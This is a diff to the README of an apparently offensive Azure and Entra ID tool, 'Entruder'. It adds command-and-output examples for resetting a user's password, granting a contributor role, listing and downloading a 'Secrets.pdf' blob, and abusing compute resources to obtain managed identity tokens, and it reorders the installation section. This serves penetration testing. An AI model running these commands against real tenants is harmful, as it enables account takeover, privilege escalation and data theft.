@@ -31,18 +31,12 @@
 
 
 ## Table of Contents
-<details>
+
 1. [About The Project](#about-the-project)
-2. [Getting Started](#getting-started)
-   - [Prerequisites](#prerequisites)
-   - [Installation](#installation)
+2. [Installation](#installation)
 3. [Usage](#usage)
-4. [Roadmap](#roadmap)
-5. [Contributing](#contributing)
-6. [License](#license)
-7. [Contact](#contact)
-8. [Acknowledgments](#acknowledgments)
-</details>
+4. [Contributing](#contributing)
+5. [Acknowledgments](#acknowledgments)
 
 
 ## About The Project
@@ -232,6 +226,15 @@ The info module provides general tool information and offline analysis commands.
 </details>
 
 <p align="right">(<a href="#readme-top">back to top</a>)</p>
+## Installation
+You can clone the repository and use the tool via python3.10+
+```bash
+git clone https://github.com/LGenAgul/Entruder
+cd Entruder
+pip install -e .
+entruder --help
+```
+Or download a compiled binary from releases if you don't want Python.
 
 ## Usage
 Entruder is built around a session model. Within the tool, you authenticate once, and the resulting tokens are cached, reused and refreshed automatically by every subsequent command.
@@ -375,13 +378,21 @@ entruder enum users
 <img width="1018" height="373" alt="image" src="https://github.com/user-attachments/assets/b7f831c8-19da-4b75-b296-c3b5e1e65f56" />
 
 
-### Modifying a user's password
+### Modifying objects
+Entruder can be used to modify attributes, add group members, change passwords, add role assignments, and conduct other tenant-wide write operations
+#### Modifying a users password
 ```bash
 $ entruder set password -u <TARGET_UPN> -p <NEW_PASSWORD>
 ```
 ```bash
 $ entruder set password -u jtest@satesto2026outlook.onmicrosoft.com -p 'ChangedPassword123!'
 [+] Password for abfc890f-7d22-40... successfully changed to ChangedPassword123!
+```
+#### Adding an ARM RBAC role assignment to our user
+```bash
+entruder set arm-role -rg rg-1 -res Microsoft.Storage/storageAccounts/beststorageintheworld -s 3e8cfe1d-4e52-4beb-8679-4eda267cc128  -u jtest@satesto2026outlook.onmicrosoft.com -r contributor
+
+[+] Successfully assigned contributor to abfc890f-7d22-406d-bf79-300a6d82f4b5 on resource Microsoft.Storage/storageAccounts/beststorageintheworld
 ```
 ### Elevating Privileges in the ARM plane from Global Administrator
 You can use Entruder with a Global Administrator Account to elevate their ARM privileges to User Access Administrator, so that you access all ARM resources
@@ -435,6 +446,25 @@ Immutability Policy : false
 Legal Hold          : false
 1 containers total
 ```
+#### Enumerating blobs in a container
+```bash
+entruder enum blobs -a beststorageintheworld -n secretscontainer
+Blobs in beststorageintheworld/secretscontainer
+Name          : Secrets.pdf
+Content Type  : application/pdf
+Size (bytes)  : 648841
+Last Modified : Thu, 03 Sep 2026 07:46:53 GMT
+Blob Type     : BlockBlob
+Access Tier   : Hot
+Lease Status  : unlocked
+Etag          : 0x8DF098F859694A8
+1 blobs total
+```
+And Finally we can download the blob directly
+```bash
+entruder.py get blob -a beststorageintheworld -n secretscontainer -b Secrets.pdf > secrets.pdf
+```
+
 ### Compute Exploitation
 Entruder can be used to abuse compute resources via "Contributor" role assigned users to execute code and extract managed identity tokens, an example of this would be Function Apps.
 ```bash
@@ -467,15 +497,6 @@ JUUVtQmtnNEFDVUZoTGg0QllTNE5qUXZINExYX2pTaU9PSzFpNnR6YklBIiwieG1zX3N1Yl9mY3QiOiI
 BJ-ee7kTVXZLqAoFDeXShS5vYBo8nGDIQsdnukB8coAAd6TR5C9G9fuodcEoQgGs8n0V3_F8PA", "expires_on": "1788204364", "resource": "https://graph.microsoft.com/", "token_type": "Bearer", "client_id": 
 "9596a20b-f997-4a1f-99ea-c045e0ef6d71"}
 ```
-## Installation
-You can clone the repository and use the tool via python3.10+
-```bash
-git clone https://github.com/LGenAgul/Entruder
-cd Entruder
-pip install -e .
-entruder --help
-```
-Or download a compiled binary from releases if you don't want Python.
 
 ## Acknowledgements
 This tool was built upon techniques and research offered by the following 
